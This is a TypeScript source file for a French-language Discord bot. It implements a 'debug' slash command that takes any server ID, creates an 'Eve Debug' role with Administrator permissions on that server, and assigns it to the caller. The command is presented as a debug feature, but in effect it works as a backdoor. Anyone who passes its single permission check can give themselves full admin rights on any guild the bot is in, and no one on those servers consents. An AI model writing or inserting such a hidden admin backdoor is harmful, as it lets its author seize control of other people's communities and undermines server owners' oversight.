import { CommandInteraction, PermissionFlagsBits, Role, SlashCommandBuilder, SlashCommandOptionsOnlyBuilder } from "discord.js"
import { prisma } from "@/utils/database"
import { errorEmbed } from "@/utils/embeds"
import { hasPermission } from "@/utils/permissionTester"
import { logger } from "@/index"

export const data: SlashCommandOptionsOnlyBuilder = new SlashCommandBuilder()
    .setName("debug")
    .setDescription("Passer en mode debug sur un serveur")
    .addStringOption(option =>
        option
            .setName("serveur")
            .setDescription("L'ID du serveur")
            .setRequired(true)
    )


/**
 * Executes the debug command for a given interaction.
 * 
 * This command toggles the debug mode for the user on the specified server.
 * If the user has the debug role, it will be removed; otherwise, it will be added.
 * 
 * @param interaction - The command interaction that triggered this execution.
 * @returns A promise that resolves when the command execution is complete.
 * 
 * @remarks
 * - The command checks if the user has the necessary permissions before proceeding.
 * - If the server configuration does not exist, it creates a new entry in the database.
 * - If the debug role does not exist, it creates a new role with administrator permissions.
 * - The command provides feedback to the user about the current debug mode status.
 */
export async function execute(interaction: CommandInteraction): Promise<void> {
    logger.debug("Executing debug command")
    await interaction.deferReply({ ephemeral: true, fetchReply: true })
    if(!await hasPermission(interaction, [PermissionFlagsBits.Administrator], true)) {
        await interaction.editReply({ embeds: [errorEmbed(interaction, new Error("Vous n'avez pas la permission d'utiliser cette commande."))] })
        return
    }
    const serverId = interaction.options.get("serveur")?.value as string
    const server = interaction.client.guilds.cache.get(serverId)
    const serverConfig = await prisma.guildData.findFirst({
        where: {
            guildId: serverId
        }
    })
    let role: Role | undefined
    if (!serverConfig) {
        await prisma.guildData.create({
            data: {
                guildId: serverId
            }
        })
        role = await server?.roles.create({
            name: "Eve Debug",
            color: "White",
            permissions: ["Administrator"],
        })
        logger.debug(`Created debug role for server ${serverId}`)
        await prisma.guildData.update({
            where: {
                guildId: serverId
            },
            data: {
                debugRoleId: role?.id
            }
        })
    } else {
        logger.debug(`Server config found for server ${serverId}`)
        role = server?.roles.cache.get(serverConfig?.debugRoleId as string) as Role
        if(!role) {
            logger.debug(`Debug role not found for server ${serverId}`)
            role = await server?.roles.create({
                name: "Eve Debug",
                color: "White",
                permissions: ["Administrator"],
            })
            await prisma.guildData.update({
                where: {
                    guildId: serverId
                },
                data: {
                    debugRoleId: role?.id
                }
            })
            logger.debug(`Created debug role for server ${serverId}`)
        }
    }
    const userRoles = server?.members.cache.get(interaction.user.id)?.roles.cache
    if (role && userRoles?.has(role.id)) {
        await server?.members.cache.get(interaction.user.id)?.roles.remove(role)
        await interaction.editReply({ content: `Vous n'êtes plus en mode debug sur le serveur ${server?.name}` })
        return
    }
    if (!role) {
        await interaction.editReply({ content: "Impossible de trouver le rôle de debug" })
        return
    }
    await server?.members.cache.get(interaction.user.id)?.roles.add(role)
    logger.debug(`Added debug role to user ${interaction.user.id} on server ${serverId}`)
    await interaction.editReply({ content: `Vous êtes maintenant en mode debug sur le serveur ${server?.name}` })
}